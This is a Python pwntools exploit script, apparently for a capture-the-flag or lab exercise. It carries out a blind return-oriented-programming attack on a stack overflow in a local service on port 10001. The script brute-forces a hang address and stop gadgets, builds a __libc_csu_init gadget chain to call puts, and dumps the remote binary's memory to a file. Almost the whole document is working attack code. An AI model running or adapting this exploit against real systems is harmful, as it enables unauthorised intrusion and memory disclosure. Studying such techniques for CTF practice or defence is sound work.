from pwn import *

#context.log_level = 'debug'
context.arch='amd64'


hang_addr = 0x400724


ppppppr_addr = 0x4007ba

gadget2 = ppppppr_addr - 0x1a
gadget1 = ppppppr_addr
'''
gadget1:
	mov    rdx,r13
	mov    rsi,r14
	mov    edi,r15d
	call   QWORD PTR [r12+rbx*8]
	add    rbx,0x1
	cmp    rbx,rbp
	jne    4007a0 <__libc_csu_init+0x40>
	add    rsp,0x8
gadget2:
	pop    rbx
	pop    rbp
	pop    r12
	pop    r13
	pop    r14
	pop    r15
	ret    
'''
puts_addr = 0x601018

#this func from Icemakr. thx.
def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload  = p64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += p64(0x0)     # rbx be 0x0
    payload += p64(0x1)     # rbp be 0x1
    payload += p64(jmp2)    # r12 jump to
    payload += p64(arg3)    # r13 -> rdx    arg3
    payload += p64(arg2)    # r14 -> rsi    arg2
    payload += p64(arg1)    # r15 -> edi    arg1
    payload += p64(part2)   # part2 entry will call [rbx + r12 + 0x8]
    payload += 'A' * 56     # junk
    return payload

def log_in_file(addr):
	#f = open('log.txt','a')
	#f = open('gadgets.txt','a')
	f = open('res.txt','a')
	f.write("ok addr : 0x%x\n" % addr)
	f.close()

def log_in_file1(addr,flag,data):
	#f = open('log.txt','a')
	#f = open('gadgets.txt','a')
	f = open('res.txt','a')
	if(flag):
		f.write("ok addr : 0x%x\t%s\n" % (addr,data))
	else:
		f.write("wront addr : 0x%x\t%s\n" % (addr,data))
	f.close()


def get_hang_addr(addr):
	p = remote('127.0.0.1',10001)
	payload = "A" * 72 + p64(addr)
	p.recvuntil('WelCome my friend,Do you know password?')
	p.sendline(payload)
	try:
		#for junk
		p.recvline()
		if(p.recv() != None):
			log.info("alive ! at 0x%x" % addr)
			log_in_file(addr)
			p.close()
	except EOFError as e: 
		p.close()
		log.info("dead connection! at 0x%x" % addr)

def get_gadgets_addr(addr):
	p = remote('127.0.0.1',10001)
	payload = "A" * 72 + p64(addr) + p64(1)+p64(2)+p64(3)+p64(4)+p64(5)+p64(6)+p64(hang_addr)
	p.recvuntil('WelCome my friend,Do you know password?')
	p.sendline(payload)
	try:
		#for junk
		p.recvline()
		if(p.recv() != None):
			log.info("find gadgets at 0x%x" % addr)
			log_in_file(addr)
			p.close()
	except EOFError as e: 
		p.close()
		log.info("dead connection! at 0x%x" % addr)


def find_write_func(addr):
	p = remote('127.0.0.1',10001)
	#guess is there write() ?
	#payload = "A"*72 + com_gadget(gadget1,gadget2,addr,arg1=0,arg2=0x400000,arg3=4) +p64(hang_addr)
	#guess is there puts() ?
	payload = "A"*72 + com_gadget(gadget1,gadget2,addr,arg1=0x400000)+p64(hang_addr)
	p.recvuntil('WelCome my friend,Do you know password?')
	p.sendline(payload)
	try:
		#for junk
		p.recvline()
		data = p.recv()
		if(data != None):
			log.info("find gadgets at 0x%x" % addr)
			log.info("\tget data : %s" % data)
			#raw_input('###stop')
			if(data[0:7] != "WelCome"):
				log_in_file1(addr,True,data)
			else:
				log_in_file1(addr,False,data)
			p.close()
	except EOFError as e: 
		p.close()
		log.info("dead connection! at 0x%x" % addr)


def write2file(data):
	f = open('leak.bin','a')
	f.write(data)
	f.close()

def leak(addr):
	p = remote('127.0.0.1',10001)
	#p = process('./main')
	#raw_input('#')
	payload = "A"*72 + com_gadget(gadget1,gadget2,puts_addr,arg1=addr)+p64(hang_addr)
	p.recvuntil('WelCome my friend,Do you know password?')
	p.sendline(payload)
	try:
		p.recvline()
		data = p.recvline().strip()
		if(data != None):
			try:
				data = data[0:data.index("WelCome")]
			except ValueError as e:
				data = data
			#if leak data is 0x00
			if data == "":
				data = "\x00"
			#if leak data is end with 0x0a
			elif(data[len(data)- 1] == '\n' and data[len(data)- 2] == '\n'):
				data = data.strip()
				data = data+"\x0a"
			log.info("leaking: 0x%x --> %s" % (addr,(data or '').encode('hex')))
			p.close()
			return data
	except EOFError as e: 
		p.close()
		log.info("dead connection! at 0x%x" % addr)
		return None
	

def leak1(p,addr):
	payload = "A"*72 + com_gadget(gadget1,gadget2,puts_addr,arg1=addr)+p64(hang_addr)
	p.recvuntil('WelCome my friend,Do you know password?')
	p.sendline(payload)
	p.recvline() #junk line
	data = p.recvline()
	log.info("leaking: 0x%x --> %s" % (addr,(data or '').encode('hex')))
	return data

def main():
	'''
	#p = remote('127.0.0.1',10001)
	p = process('./main')
	raw_input('$')
	payload = "A"*72 + com_gadget(gadget1,gadget2,0x601028,arg1=0,arg2=0x601060,arg3=8)
	p.recvuntil('WelCome my friend,Do you know password?')
	p.sendline(payload)
	p.interactive()
	'''
	'''
	addr_base = 0x400730
	for i in xrange(0xffffff):
		addr = addr_base + i
		get_hang_addr(addr)
	'''
	'''
	addr_base = 0x400740
	for i in xrange(0xffffff):
		addr = addr_base + i
		get_gadgets_addr(addr)
	'''
	'''
	addr_base = 0x600000-1
	for i in xrange(0xffffff):
		addr = addr_base + i
		find_write_func(addr)
	'''

	#dump bin
	addr = 0x600000
	while True:
		data = leak(addr)
		addr += len(data)
		write2file(data)


if __name__ == '__main__':
	main()
